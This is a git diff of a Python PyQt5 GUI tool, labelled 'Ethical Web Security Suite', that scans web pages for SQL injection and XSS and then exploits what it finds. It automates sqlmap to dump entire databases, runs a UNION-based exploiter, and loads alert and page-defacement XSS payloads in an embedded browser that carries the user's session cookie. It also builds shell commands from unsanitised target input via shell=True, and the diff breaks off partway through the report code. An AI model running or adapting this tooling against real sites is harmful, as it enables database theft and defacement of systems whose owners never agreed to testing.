@@ -1,32 +1,38 @@
 import sys
 import subprocess
-import re
-import webbrowser
 import os
 import glob
-import getpass
 import csv
-import shutil
+import webbrowser
+import requests  # <--- THÊM
+import time      # <--- THÊM
+import getpass
+from urllib.parse import urlparse, urljoin, parse_qs, urlencode
 from datetime import datetime
-
+from PyQt5.QtNetwork import QNetworkCookie # <--- QUAN TRỌNG
+from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEnginePage, QWebEngineProfile # <--- CẬP NHẬT
 from PyQt5.QtWidgets import (
     QMessageBox, QApplication, QMainWindow, QWidget, QVBoxLayout, 
     QHBoxLayout, QLineEdit, QPushButton, QTextEdit, QProgressBar, 
-    QLabel, QTreeWidget, QTreeWidgetItem, QSplitter
+    QLabel, QTreeWidget, QTreeWidgetItem, QSplitter, QGroupBox, QGridLayout, QDialog, QTabWidget
 )
-from PyQt5.QtCore import QObject, QThread, pyqtSignal, Qt
-from urllib.parse import urlparse, parse_qs, urlencode
+from PyQt5.QtCore import QObject, QThread, pyqtSignal, Qt, QUrl
+from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEnginePage
 
-# Import các module core
+# --- IMPORT MODULES CORE ---
+# Đảm bảo bạn đã có các file này trong thư mục core/ và reporting/
 from core.scanner import ScannerWorker
 from core.exploiter import UnionExploiter
 from reporting.generator import generate_report
 
-# --- WORKER 1: CHẠY SQLMAP ---
+# =============================================================================
+# WORKER 1: SQLMAP WRAPPER (CHẾ ĐỘ THÔNG MINH - SMART DUMP)
+# =============================================================================
+# =============================================================================
+# WORKER 1: SQLMAP WRAPPER (ĐÃ SỬA LỖI POST DATA TRỐNG)
+# =============================================================================
 class AttackOrchestratorWorker(QObject):
     log_received = pyqtSignal(str)
-    database_found = pyqtSignal(str)
-    tables_found = pyqtSignal(str, list)
     process_finished = pyqtSignal(dict)
 
     def __init__(self, vuln_data):
@@ -37,6 +43,7 @@ class AttackOrchestratorWorker(QObject):
 
     def _run_command(self, command):
         try:
+            self.log_received.emit(f"CMD: {command}")
             self.process = subprocess.Popen(
                 command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                 shell=True, text=True, encoding='utf-8', errors='replace'
@@ -46,349 +53,612 @@ class AttackOrchestratorWorker(QObject):
                 clean_line = line.strip()
                 if clean_line:
                     self.log_received.emit(clean_line)
-                    yield clean_line
             self.process.stdout.close()
             self.process.wait()
         except Exception as e:
-            self.log_received.emit(f"\n[ERROR] Failed: {e}")
+            self.log_received.emit(f"[ERROR] SQLMap Error: {e}")
 
     def run(self):
-        # 1. Cấu hình cơ bản (KHÔNG để các tham số -D, -T, --dump ở đây)
+        # 1. Cấu hình đường dẫn Output (Fix lỗi không tìm thấy file CSV)
+        current_dir = os.getcwd()
+        output_dir = os.path.join(current_dir, "sqlmap_results")
+        if not os.path.exists(output_dir):
+            os.makedirs(output_dir)
+
+        # 2. Cấu hình SQLMap cơ bản
+        base_opts = (
+            "--time-sec 10 "
+            "--random-agent "
+            "--skip-static "
+            "--threads=10 "
+            "--batch "
+            "--dump "
+            f'--output-dir="{output_dir}"'
+        )
+        
+        target_url = self.vuln_data['url']
+        cookie = self.vuln_data.get("cookie", "")
+        cookie_cmd = f"--cookie=\"{cookie}\"" if cookie else ""
+        param = self.vuln_data.get('parameter', '')
         method = self.vuln_data.get("method", "GET")
-        base_opts = "--batch --tamper=space2comment --threads=10 --time-sec=1 --common-columns --hex --fresh-queries"
-        
-        target = f"-u \"{self.vuln_data['url']}\""
+
+        # 3. XỬ LÝ LỖI POST DATA BỊ RỖNG (QUAN TRỌNG)
         if method == "POST":
-            data_str = urlencode(self.vuln_data.get('data', {}))
-            target = f"-u \"{self.vuln_data['url']}\" --data=\"{data_str}\" -p \"{self.vuln_data['parameter']}\""
-        
-        cookie = f" --cookie=\"{self.vuln_data['cookie']}\"" if self.vuln_data.get("cookie") else ""
-        
-        # Lệnh gốc để tái sử dụng
-        cmd_root = f"sqlmap {target} {cookie} {base_opts}"
-
-        # --- STEP 1: DATABASES ---
-        self.log_received.emit("\n" + "="*20 + " STEP 1: FETCHING DATABASES " + "="*20)
-        found_dbs = []
-        for line in self._run_command(f"{cmd_root} --dbs"):
-            if line.startswith('[*]') and not any(x in line for x in ['schema', 'mysql', 'sys', 'ending @']):
-                db = line[4:].strip()
-                found_dbs.append(db)
-                self.database_found.emit(db)
-
-        # --- STEP 2: TABLES ---
-        for db in found_dbs:
-            self.log_received.emit("\n" + "="*20 + f" STEP 2: TABLES FOR {db} " + "="*20)
-            tables = []
-            parsing = False
-            for line in self._run_command(f"{cmd_root} -D \"{db}\" --tables"):
-                if line.strip().startswith('+---'): parsing = not parsing; continue
-                if parsing and '|' in line:
-                    table = line.split('|')[1].strip()
-                    if table.lower() != "table": tables.append(table)
+            post_data = self.vuln_data.get("post_data", "")
             
-            if tables:
-                self.tables_found.emit(db, tables)
+            # [FIX] Nếu post_data rỗng, tự tạo data giả để SQLMap có cái mà inject
+            if not post_data or param not in post_data:
+                self.log_received.emit(f"[WARN] Dữ liệu POST gốc bị thiếu. Đang tự tạo payload cho tham số '{param}'...")
+                # Tạo chuỗi data dạng: param=1 (để SQLMap inject vào đây)
+                post_data = f"{param}=1" 
                 
-                # --- STEP 3: DUMP DATA (QUAN TRỌNG NHẤT) ---
-                for t in tables:
-                    self.log_received.emit("\n" + "-"*20 + f" STEP 3: DUMPING {db}.{t} " + "-"*20)
-                    # Lệnh dump phải đầy đủ -D và -T
-                    dump_cmd = f"{cmd_root} -D \"{db}\" -T \"{t}\" --dump --no-cast"
-                    for _ in self._run_command(dump_cmd): pass
+            cmd_root = (
+                f'sqlmap -u "{target_url}" '
+                f'--data="{post_data}" '
+                f'-p "{param}" {cookie_cmd} {base_opts}'
+            )
+        else:
+            # Dạng GET
+            cmd_root = (
+                f'sqlmap -u "{target_url}" '
+                f'-p "{param}" {cookie_cmd} {base_opts}'
+            )
 
+        self.log_received.emit("\n" + "="*50)
+        self.log_received.emit(f"[*] BẮT ĐẦU DUMP (Param: {param} | Method: {method})")
+        self.log_received.emit(f"[*] Output Dir: {output_dir}")
+        self.log_received.emit("="*50 + "\n")
+        
+        self._run_command(cmd_root)
         self.process_finished.emit({})
 
     def stop(self):
         self._is_stopped = True
-        if self.process:
-            self.process.terminate()
+        if self.process: self.process.terminate()
+# Thêm class này để bắt sự kiện alert() của Javascript
+class CustomWebEnginePage(QWebEnginePage):
+    def javaScriptAlert(self, securityOrigin, msg):
+        # Khi web chạy lệnh alert(), hàm này được gọi
+        QMessageBox.warning(None, "XSS TRIGGERED (Thành công)", f"Mã độc JavaScript đã chạy!\n\nNội dung alert: {msg}")
+# =============================================================================
+# DIALOG: TRÌNH DUYỆT MÔ PHỎNG XSS
+# =============================================================================
+# =============================================================================
+# DIALOG: TRÌNH DUYỆT MÔ PHỎNG XSS (CẬP NHẬT: CHO PHÉP SỬA URL & FIX LỖI 2 PARAM)
+# =============================================================================
+class XSSSimulatorDialog(QDialog):
+    def __init__(self, url, parameter, cookie_str, payload_type="alert"):
+        super().__init__()
+        self.setWindowTitle("XSS Exploitation Simulator - Real Session Mode")
+        self.resize(1100, 750)
+        self.layout = QVBoxLayout(self)
 
-# --- CHƯƠNG TRÌNH CHÍNH ---
+        # 1. Thanh địa chỉ & Nút chạy lại
+        control_layout = QHBoxLayout()
+        self.url_display = QLineEdit()
+        
+        # Nút Reload để test payload mới
+        self.btn_reload = QPushButton("🔄 CHẠY PAYLOAD")
+        self.btn_reload.clicked.connect(self.load_current_url)
+        self.btn_reload.setStyleSheet("background: #2980b9; color: white; font-weight: bold;")
+
+        control_layout.addWidget(QLabel("Payload URL (Có thể sửa):"))
+        control_layout.addWidget(self.url_display)
+        control_layout.addWidget(self.btn_reload)
+        self.layout.addLayout(control_layout)
+
+        # 2. Khởi tạo Trình duyệt
+        self.browser = QWebEngineView()
+        self.custom_page = CustomWebEnginePage(self.browser)
+        self.browser.setPage(self.custom_page)
+        self.layout.addWidget(self.browser)
+
+        # 3. Log Console
+        self.log_console = QTextEdit()
+        self.log_console.setFixedHeight(100)
+        self.log_console.setReadOnly(True)
+        self.log_console.setStyleSheet("background: #222; color: #0f0; font-family: Consolas;")
+        self.layout.addWidget(self.log_console)
+
+        # 4. XỬ LÝ COOKIE & CHẠY
+        self.setup_browser(url, parameter, cookie_str, payload_type)
+
+    def setup_browser(self, url, param, cookie_str, p_type):
+        # A. Xử lý Cookie (như cũ)
+        parsed_url = urlparse(url)
+        domain = parsed_url.hostname
+        if cookie_str:
+            store = self.browser.page().profile().cookieStore()
+            try:
+                for item in cookie_str.split(';'):
+                    if '=' in item:
+                        name, value = item.strip().split('=', 1)
+                        q_cookie = QNetworkCookie(name.encode(), value.encode())
+                        q_cookie.setDomain(domain)
+                        q_cookie.setPath("/")
+                        store.setCookie(q_cookie)
+            except: pass
+
+        # B. TẠO PAYLOAD (Sửa lại để thông minh hơn)
+        # Payload này nhẹ hơn, không dùng dấu " để tránh lỗi SQL
+        if p_type == "alert":
+            # Dùng payload Polyglot hoặc đơn giản
+            payload = "<script>alert('HACKED')</script>"
+        elif p_type == "deface":
+            payload = "<script>document.body.innerHTML='<h1>DEFACED</h1>'</script>"
+        
+        # C. XỬ LÝ URL (Fix lỗi lặp tham số ?pic=...&pic=...)
+        # Nếu URL đã có tham số, ta thay thế nó thay vì nối thêm
+        if param in url:
+            # URL gốc: ...php?pic=123
+            # Logic: Thay thế giá trị của param bằng payload
+            import re
+            # Regex tìm: param=... cho đến ký tự & hoặc hết chuỗi
+            regex = f"({param}=)([^&]*)"
+            final_url = re.sub(regex, f"\\1{payload}", url)
+        else:
+            # Nếu chưa có thì nối thêm
+            separator = "&" if "?" in url else "?"
+            final_url = f"{url}{separator}{param}={payload}"
+        
+        self.url_display.setText(final_url)
+        self.load_current_url()
+
+    def load_current_url(self):
+        target = self.url_display.text()
+        self.log_console.append(f"[*] Đang tải: {target}")
+        self.browser.setUrl(QUrl(target))
+# =============================================================================
+# MAIN WINDOW
+# =============================================================================
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("Ethical Web Vulnerability Scanner & Auto-Exploiter")
-        self.setGeometry(100, 100, 1000, 900)
-        
+        self.setWindowTitle("Ethical Web Security Suite v3.0 (Ultimate Edition)")
+        self.resize(1200, 850)
         self.vulnerabilities = []
-        self.db_tree_items = {}
-        self.scanner_thread = None
-        self.attack_thread = None
-        
+        self.all_dumped_data = {}
         self.init_ui()
 
     def init_ui(self):
-        central_widget = QWidget()
-        self.setCentralWidget(central_widget)
-        main_layout = QVBoxLayout(central_widget)
+        central = QWidget()
+        self.setCentralWidget(central)
+        layout = QVBoxLayout(central)
 
-        # 1. Input Group (URL & Cookie)
-        input_card = QWidget()
-        input_card.setStyleSheet("background-color: #f8f9fa; border: 1px solid #dee2e6; border-radius: 5px;")
-        input_layout = QVBoxLayout(input_card)
-        
-        self.url_input = QLineEdit()
-        self.url_input.setPlaceholderText("Target URL: http://localhost/qlthoitrang/?frame=chitietsp&id=31")
+        # 1. INPUT AREA
+        top_box = QGroupBox("Cấu hình Mục tiêu")
+        grid = QGridLayout()
+        self.url_input = QLineEdit("http://localhost/qlthoitrang/?frame=chitietsp&id=31")
         self.cookie_input = QLineEdit()
-        self.cookie_input.setPlaceholderText("Cookie: PHPSESSID=abc123def...")
+        self.cookie_input.setPlaceholderText("Ví dụ: PHPSESSID=abc123xyz...")
         
-        input_layout.addWidget(QLabel("Target URL:"))
-        input_layout.addWidget(self.url_input)
-        input_layout.addWidget(QLabel("Authentication Cookie (Optional):"))
-        input_layout.addWidget(self.cookie_input)
+        grid.addWidget(QLabel("Target URL:"), 0, 0)
+        grid.addWidget(self.url_input, 0, 1)
+        grid.addWidget(QLabel("Auth Cookie:"), 1, 0)
+        grid.addWidget(self.cookie_input, 1, 1)
         
-        self.scan_button = QPushButton("🚀 Start Security Scan")
-        self.scan_button.setStyleSheet("background-color: #007bff; color: white; font-weight: bold; height: 40px;")
-        self.scan_button.clicked.connect(self.start_scan)
-        input_layout.addWidget(self.scan_button)
+        self.scan_btn = QPushButton("🚀 BẮT ĐẦU QUÉT")
+        self.scan_btn.setStyleSheet("background: #27ae60; color: white; font-weight: bold; height: 40px; font-size: 14px;")
+        self.scan_btn.clicked.connect(self.start_scan)
+        grid.addWidget(self.scan_btn, 0, 2, 2, 1)
         
-        main_layout.addWidget(input_card)
-        self.url_input.setStyleSheet("""
-            QLineEdit {
-                background-color: white;
-                color: black;
-                border: 1px solid #ced4da;
-                padding: 6px;
-                border-radius: 4px;
-            }
-        """)
+        top_box.setLayout(grid)
+        layout.addWidget(top_box)
 
-        self.cookie_input.setStyleSheet("""
-            QLineEdit {
-                background-color: white;
-                color: black;
-                border: 1px solid #ced4da;
-                padding: 6px;
-                border-radius: 4px;
-            }
-        """)
-
-
-        # 2. Progress Bar
-        self.progress_bar = QProgressBar()
-        main_layout.addWidget(self.progress_bar)
-
-        # 3. Log & Results (Sử dụng Splitter)
+        # 2. MAIN CONTENT (Splitter)
         splitter = QSplitter(Qt.Vertical)
 
-        # Kết quả quét
+        # A. Results Table
         res_widget = QWidget()
         res_layout = QVBoxLayout(res_widget)
-        res_layout.addWidget(QLabel("Vulnerability Scan Results:"))
-        self.results_tree = QTreeWidget()
-        self.results_tree.setHeaderLabels(["Vulnerability Type", "URL", "Parameter"])
-        self.results_tree.setFixedHeight(180)
-        self.results_tree.itemSelectionChanged.connect(self.on_item_selection_changed)
-        res_layout.addWidget(self.results_tree)
+        self.res_tree = QTreeWidget()
+        self.res_tree.setHeaderLabels(["Loại Lỗ Hổng", "URL", "Tham số", "Phương thức"])
+        self.res_tree.itemSelectionChanged.connect(self.on_selection_changed)
+        res_layout.addWidget(self.res_tree)
         
-        btn_layout = QHBoxLayout()
-        self.attack_button = QPushButton("🔥 Dump Data (sqlmap)")
-        self.attack_button.setEnabled(False)
-        self.report_button = QPushButton("📄 Generate Scan Report")
-        self.report_button.setEnabled(False)
-        btn_layout.addWidget(self.attack_button)
-        btn_layout.addWidget(self.report_button)
-        res_layout.addLayout(btn_layout)
+        # Buttons Bar
+        btn_box = QHBoxLayout()
+        self.logic_scan_btn = QPushButton("🛡️ QUÉT LOGIC NÂNG CAO")
+        self.logic_scan_btn.setStyleSheet("background: #8e44ad; color: white; font-weight: bold;")
+        self.logic_scan_btn.clicked.connect(self.open_logic_scan_dialog)
+        btn_box.addWidget(self.logic_scan_btn)
+        self.fast_exploit_btn = QPushButton("⚡ KHAI THÁC NHANH (SQLi)")
+        self.sqlmap_btn = QPushButton("🔥 DUMP TOÀN BỘ (SQLMap)")
+        self.xss_alert_btn = QPushButton("🚨 DEMO XSS (Alert)")
+        self.xss_deface_btn = QPushButton("☠️ DEMO XSS (Deface)")
+        self.report_btn = QPushButton("📄 XUẤT BÁO CÁO")
         
+        # Style buttons
+        self.fast_exploit_btn.setStyleSheet("background: #e67e22; color: white;")
+        self.sqlmap_btn.setStyleSheet("background: #c0392b; color: white;")
+        self.xss_alert_btn.setStyleSheet("background: #8e44ad; color: white;")
+        self.xss_deface_btn.setStyleSheet("background: #2c3e50; color: white;")
+        
+        for b in [self.fast_exploit_btn, self.sqlmap_btn, self.xss_alert_btn, self.xss_deface_btn, self.report_btn]:
+            b.setEnabled(False)
+            btn_box.addWidget(b)
+        
+        res_layout.addLayout(btn_box)
         splitter.addWidget(res_widget)
 
-        # Cấu trúc Database & Log tấn công
-        bottom_widget = QWidget()
-        bottom_layout = QHBoxLayout(bottom_widget)
+        # B. Logs & Database Viewer
+        bottom_tabs = QTabWidget()
         
-        # Cây DB
-        db_box = QVBoxLayout()
-        db_box.addWidget(QLabel("Discovered Database Structure:"))
-        self.db_structure_tree = QTreeWidget()
-        self.db_structure_tree.setHeaderLabels(["Databases & Tables"])
-        db_box.addWidget(self.db_structure_tree)
-        bottom_layout.addLayout(db_box, 1)
+        # Tab 1: Cấu trúc DB
+        self.db_tree = QTreeWidget()
+        self.db_tree.setHeaderLabels(["Database & Dữ liệu đã Dump"])
+        bottom_tabs.addTab(self.db_tree, "📦 Dữ liệu Khai thác")
         
-        # Log Output
-        log_box = QVBoxLayout()
-        log_box.addWidget(QLabel("Attack Process Log:"))
-        self.attack_output = QTextEdit()
-        self.attack_output.setReadOnly(True)
-        self.attack_output.setStyleSheet("background-color: #1e1e1e; color: #00ff00; font-family: 'Consolas';")
-        log_box.addWidget(self.attack_output)
-        bottom_layout.addLayout(log_box, 2)
+        # Tab 2: Logs
+        self.log_output = QTextEdit()
+        self.log_output.setReadOnly(True)
+        self.log_output.setStyleSheet("background: #1e1e1e; color: #00ff00; font-family: Consolas;")
+        bottom_tabs.addTab(self.log_output, "📝 Nhật ký Hệ thống")
         
-        splitter.addWidget(bottom_widget)
-        main_layout.addWidget(splitter)
+        splitter.addWidget(bottom_tabs)
+        layout.addWidget(splitter)
 
-        # Connect signals
-        self.attack_button.clicked.connect(self.start_attack)
-        self.report_button.clicked.connect(self.generate_scan_report)
+        # 3. Progress Bar
+        self.progress = QProgressBar()
+        layout.addWidget(self.progress)
 
-    # --- HÀM XỬ LÝ QUÉT ---
+        # CONNECT SIGNALS
+        self.fast_exploit_btn.clicked.connect(self.start_fast_exploit)
+        self.sqlmap_btn.clicked.connect(self.start_sqlmap_attack)
+        self.xss_alert_btn.clicked.connect(lambda: self.simulate_xss("alert"))
+        self.xss_deface_btn.clicked.connect(lambda: self.simulate_xss("deface"))
+        self.report_btn.clicked.connect(self.generate_final_report)
+
+    # --- LOGIC GIAO DIỆN ---
+    def on_selection_changed(self):
+        sel = self.res_tree.selectedItems()
+        if not sel: return
+        
+        vuln_type = sel[0].text(0)
+        is_sqli = "SQLi" in vuln_type
+        is_xss = "XSS" in vuln_type
+        
+        self.fast_exploit_btn.setEnabled(is_sqli)
+        self.sqlmap_btn.setEnabled(is_sqli)
+        self.xss_alert_btn.setEnabled(is_xss)
+        self.xss_deface_btn.setEnabled(is_xss)
+
+    # --- SCANNER ---
     def start_scan(self):
-        base_url = self.url_input.text()
-        cookie = self.cookie_input.text()
-        if not base_url: return
-
-        self.scan_button.setEnabled(False)
-        self.results_tree.clear()
-        self.attack_output.clear()
-        self.progress_bar.setValue(0)
+        url = self.url_input.text()
+        if not url: return
         
-        self.scanner_thread = QThread()
-        self.scanner_worker = ScannerWorker(base_url, cookie)
-        self.scanner_worker.moveToThread(self.scanner_thread)
-        
-        self.scanner_thread.started.connect(self.scanner_worker.run_scan)
-        self.scanner_worker.log_updated.connect(lambda msg: self.attack_output.append(msg))
-        self.scanner_worker.progress_updated.connect(lambda c, t: self.progress_bar.setValue(int(c/t*100)))
-        self.scanner_worker.scan_finished.connect(self.scan_done)
-        
-        self.scanner_thread.start()
-
-    def scan_done(self, vulnerabilities):
-        self.vulnerabilities = vulnerabilities
-        self.display_results()
-        self.scanner_thread.quit()
-        self.scan_button.setEnabled(True)
-        if vulnerabilities: self.report_button.setEnabled(True)
-
-    def display_results(self):
-        self.results_tree.clear()
-        for vuln in self.vulnerabilities:
-            self.results_tree.addTopLevelItem(QTreeWidgetItem([vuln['type'], vuln['url'], vuln['parameter']]))
-        for i in range(3): self.results_tree.resizeColumnToContents(i)
-
-    # --- HÀM XỬ LÝ TẤN CÔNG ---
-    def on_item_selection_changed(self):
-        selected = self.results_tree.selectedItems()
-        is_sqli = selected and "SQLi" in selected[0].text(0)
-        self.attack_button.setEnabled(is_sqli)
-
-    def start_attack(self):
-        selected = self.results_tree.selectedItems()
-        if not selected: return
-        
-        vuln_data = next((v for v in self.vulnerabilities if v['url'] == selected[0].text(1) and v['parameter'] == selected[0].text(2)), None)
-        if not vuln_data: return
-
-        vuln_data['cookie'] = self.cookie_input.text()
-        self.attack_button.setEnabled(False)
-        self.attack_output.clear()
-        self.db_structure_tree.clear()
-        self.db_tree_items = {}
-
-        self.attack_thread = QThread()
-        self.attack_worker = AttackOrchestratorWorker(vuln_data)
-        self.attack_worker.moveToThread(self.attack_thread)
-
-        self.attack_thread.started.connect(self.attack_worker.run)
-        self.attack_worker.log_received.connect(self.update_attack_output)
-        self.attack_worker.database_found.connect(self.add_database_to_tree)
-        self.attack_worker.tables_found.connect(self.add_tables_to_db_node)
-        self.attack_worker.process_finished.connect(self.attack_finished)
-        
-        self.attack_thread.start()
-
-    def add_database_to_tree(self, db_name):
-        item = QTreeWidgetItem([db_name])
-        self.db_structure_tree.addTopLevelItem(item)
-        self.db_tree_items[db_name] = item
-
-    def add_tables_to_db_node(self, db_name, tables):
-        if db_name in self.db_tree_items:
-            parent = self.db_tree_items[db_name]
-            for t in tables: parent.addChild(QTreeWidgetItem([t]))
-            parent.setExpanded(True)
-
-    def attack_finished(self, _):
-        self.update_attack_output("\n[*] SQLMap hoàn tất. Đang tìm file CSV...")
-        self.attack_thread.quit()
-        
-        # Đường dẫn gốc chứa toàn bộ output
-        output_base = os.path.expanduser("~/.local/share/sqlmap/output")
+        self.vulnerabilities = []
         self.all_dumped_data = {}
-        has_data = False
+        self.db_tree.clear()
+        
+        self.res_tree.clear()
+        self.log_output.clear()
+        self.log_output.append(f"[*] Đang khởi động Scanner tới: {url}")
+        
+        self.scan_thread = QThread()
+        self.scan_worker = ScannerWorker(url, self.cookie_input.text())
+        self.scan_worker.moveToThread(self.scan_thread)
+        
+        self.scan_thread.started.connect(self.scan_worker.run_scan)
+        self.scan_worker.log_updated.connect(self.log_output.append)
+        self.scan_worker.progress_updated.connect(lambda c, t: self.progress.setValue(int(c/t*100)))
+        self.scan_worker.scan_finished.connect(self.on_scan_done)
+        
+        self.scan_thread.start()
+    # --- LOGIC SCANNING (SECOND-ORDER) ---
+    def open_logic_scan_dialog(self):
+        """Hàm mở hộp thoại nhập liệu và bắt đầu tiến trình quét Logic"""
+        dialog = AdvancedScanDialog(self)
+        if dialog.exec_() == QDialog.Accepted:
+            # 1. Lấy dữ liệu từ Dialog
+            login_u, cart_u, check_u, user_p, pass_p = dialog.get_data()
+            
+            # 2. Chuẩn bị giao diện
+            self.log_output.clear()
+            self.log_output.append("[*] Đang khởi tạo Logic Scanner...")
+            
+            # 3. Khởi tạo Thread và Worker
+            self.logic_thread = QThread()
+            self.logic_worker = LogicScannerWorker(login_u, cart_u, check_u, user_p, pass_p)
+            self.logic_worker.moveToThread(self.logic_thread)
+            
+            # 4. Kết nối tín hiệu
+            self.logic_thread.started.connect(self.logic_worker.run)
+            self.logic_worker.log_updated.connect(self.log_output.append)
+            self.logic_worker.scan_finished.connect(self.on_logic_scan_finished)
+            
+            # 5. Bắt đầu chạy
+            self.logic_thread.start()
+            self.logic_scan_btn.setEnabled(False) # Khóa nút để tránh bấm nhiều lần
 
-        if not os.path.exists(output_base):
-            self.update_attack_output("[!] Không thấy thư mục output của SQLMap.")
+    def on_logic_scan_finished(self):
+        """Hàm dọn dẹp sau khi quét Logic xong"""
+        self.logic_thread.quit()
+        self.logic_thread.wait()
+        self.logic_scan_btn.setEnabled(True) # Mở lại nút
+        QMessageBox.information(self, "Hoàn tất", "Quá trình quét Logic Flow đã kết thúc.\nVui lòng kiểm tra Log để xem kết quả.")
+    def on_scan_done(self, vulns):
+        self.vulnerabilities = vulns
+        for v in vulns:
+            item = QTreeWidgetItem([v['type'], v['url'], v['parameter'], v['method']])
+            if "XSS" in v['type']:
+                item.setForeground(0, Qt.red)
+            else:
+                item.setForeground(0, Qt.blue)
+            self.res_tree.addTopLevelItem(item)
+        
+        self.scan_thread.quit()
+        self.report_btn.setEnabled(len(vulns) > 0)
+        QMessageBox.information(self, "Hoàn tất", f"Tìm thấy {len(vulns)} lỗ hổng tiềm năng.")
+
+    # --- FAST EXPLOIT (Custom Python) ---
+    def start_fast_exploit(self):
+        item = self.res_tree.selectedItems()[0]
+        vuln = next(v for v in self.vulnerabilities if v['url'] == item.text(1))
+        if vuln['method'] != "GET":
+            QMessageBox.warning(
+                self,
+                "Không hỗ trợ",
+                "Fast Exploit chỉ hỗ trợ SQLi dạng GET.\n"
+                "Với POST SQLi, hãy dùng SQLMap."
+            )
             return
+        self.log_output.append("\n[⚡] ĐANG CHẠY FAST EXPLOIT (PYTHON UNION)...")
+        exploiter = UnionExploiter(vuln['url'], vuln['parameter'], self.cookie_input.text())
+        
+        # Chạy trực tiếp (có thể hơi lag UI một chút nhưng nhanh)
+        data, _ = exploiter.run(progress_callback=self.log_output.append)
+        
+        if data:
+            self.db_tree.clear()
+            
+            # Hiển thị Info
+            if 'server_info' in data:
+                root = QTreeWidgetItem(["SERVER INFO"])
+                root.addChild(QTreeWidgetItem([data['server_info']]))
+                self.db_tree.addTopLevelItem(root)
+            
+            # Hiển thị Tables tìm được
+            if 'tables' in data and data['tables']:
+                t_root = QTreeWidgetItem(["FOUND TABLES (Smart Guessing)"])
+                for t in data['tables']:
+                    t_root.addChild(QTreeWidgetItem([t]))
+                self.db_tree.addTopLevelItem(t_root)
+            
+            self.all_dumped_data['Fast_Exploit'] = data
+            QMessageBox.information(self, "Thành công", "Khai thác nhanh hoàn tất! Kiểm tra tab Dữ liệu.")
 
-        # Quét tất cả các folder (localhost, 127.0.0.1, ...)
-        for target_dir in os.listdir(output_base):
-            dump_path = os.path.join(output_base, target_dir, "dump")
-            if not os.path.exists(dump_path): continue
+    # --- DEEP EXPLOIT (SQLMap) ---
+    def start_sqlmap_attack(self):
+        item = self.res_tree.selectedItems()[0]
+        vuln = next(v for v in self.vulnerabilities if v['url'] == item.text(1))
+        vuln['cookie'] = self.cookie_input.text()
+        
+        self.sqlmap_thread = QThread()
+        self.sqlmap_worker = AttackOrchestratorWorker(vuln)
+        self.sqlmap_worker.moveToThread(self.sqlmap_thread)
+        
+        self.sqlmap_thread.started.connect(self.sqlmap_worker.run)
+        self.sqlmap_worker.log_received.connect(self.log_output.append)
+        self.sqlmap_worker.process_finished.connect(self.on_sqlmap_done)
+        
+        self.sqlmap_thread.start()
 
-            for db_name in os.listdir(dump_path):
-                db_dir = os.path.join(dump_path, db_name)
-                if os.path.isdir(db_dir):
-                    if db_name not in self.all_dumped_data: self.all_dumped_data[db_name] = {}
+    def on_sqlmap_done(self, _):
+        self.sqlmap_thread.quit()
+        self.log_output.append("\n[✔] SQLMap hoàn tất. Đang đọc dữ liệu...")
+        self.db_tree.clear()
+        
+        # 1. Trỏ đúng vào thư mục output đã định nghĩa ở Worker
+        current_dir = os.getcwd()
+        base_output_path = os.path.join(current_dir, "sqlmap_results")
+        
+        has_data = False
+        
+        # Kiểm tra nếu thư mục tồn tại
+        if os.path.exists(base_output_path):
+            # Duyệt qua các thư mục target (thường là hostname, ví dụ: localhost)
+            for target_hostname in os.listdir(base_output_path):
+                target_path = os.path.join(base_output_path, target_hostname)
+                
+                # SQLMap cấu trúc: output_dir/hostname/dump/db_name/table.csv
+                dump_path = os.path.join(target_path, "dump")
+                
+                if not os.path.exists(dump_path): 
+                    continue
+
+                for db_name in os.listdir(dump_path):
+                    db_full_path = os.path.join(dump_path, db_name)
+                    if not os.path.isdir(db_full_path): continue
                     
-                    for csv_file in glob.glob(os.path.join(db_dir, "*.csv")):
+                    # Vẫn giữ lọc hệ thống, nhưng log ra để biết
+                    if db_name in ['information_schema', 'mysql', 'performance_schema', 'sys']: 
+                        self.log_output.append(f"[*] Bỏ qua DB hệ thống: {db_name}")
+                        continue
+
+                    # Tạo Node DB trên giao diện
+                    db_node = QTreeWidgetItem([f"DB: {db_name}"])
+                    self.db_tree.addTopLevelItem(db_node)
+
+                    # Tìm file CSV
+                    csv_files = glob.glob(os.path.join(db_full_path, "*.csv"))
+                    if not csv_files:
+                        self.log_output.append(f"[!] DB {db_name} rỗng hoặc chưa dump được bảng nào.")
+
+                    for csv_file in csv_files:
                         table_name = os.path.basename(csv_file).replace(".csv", "")
                         try:
                             with open(csv_file, 'r', encoding='utf-8') as f:
                                 reader = csv.reader(f)
                                 rows = list(reader)
                                 if rows:
-                                    self.all_dumped_data[db_name][table_name] = {
-                                        'headers': rows[0],
-                                        'records': rows[1:]
-                                    }
+                                    # Lưu vào biến toàn cục để xuất báo cáo
+                                    if db_name not in self.all_dumped_data:
+                                        self.all_dumped_data[db_name] = {}
+                                    
+                                    headers = rows[0]
+                                    records = rows[1:]
+                                    self.all_dumped_data[db_name][table_name] = {'headers': headers, 'records': records}
+                                    
+                                    # Hiển thị lên cây
+                                    t_node = QTreeWidgetItem([f"Table: {table_name} ({len(records)} dòng)"])
+                                    db_node.addChild(t_node)
                                     has_data = True
-                        except: continue
-
+                        except Exception as e: 
+                            self.log_output.append(f"[ERROR] Không đọc được file {table_name}: {e}")
+        
         if has_data:
-            self.update_attack_output("[+] Đã tải dữ liệu thành công. Đang tạo báo cáo...")
-            self.generate_scan_report()
+            QMessageBox.information(self, "Thành công", "Đã Dump dữ liệu thành công! Hãy kiểm tra tab 'Dữ liệu Khai thác'.")
         else:
-            self.update_attack_output("[!] SQLMap không dump được bản ghi nào. Hãy kiểm tra xem bảng có dữ liệu không.")
+            QMessageBox.warning(self, "Cảnh báo", 
+                                f"SQLMap chạy xong nhưng không tìm thấy file CSV.\n"
+                                f"Vui lòng kiểm tra thủ công tại thư mục:\n{base_output_path}")
 
-    def generate_html_report(self, data):
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"dump_report_{timestamp}.html"
-        
-        css = "<style>body{font-family:sans-serif; background:#f4f4f9; padding:20px} table{width:100%; border-collapse:collapse; background:#fff; margin-bottom:30px} th,td{border:1px solid #ddd; padding:10px; text-align:left} th{background:#3498db; color:white} h2{color:#2c3e50; border-bottom:2px solid #3498db}</style>"
-        html = f"<html><head><title>SQLi Report</title>{css}</head><body><h1>SQL Injection Data Dump</h1>"
-        
-        for db, tables in data.items():
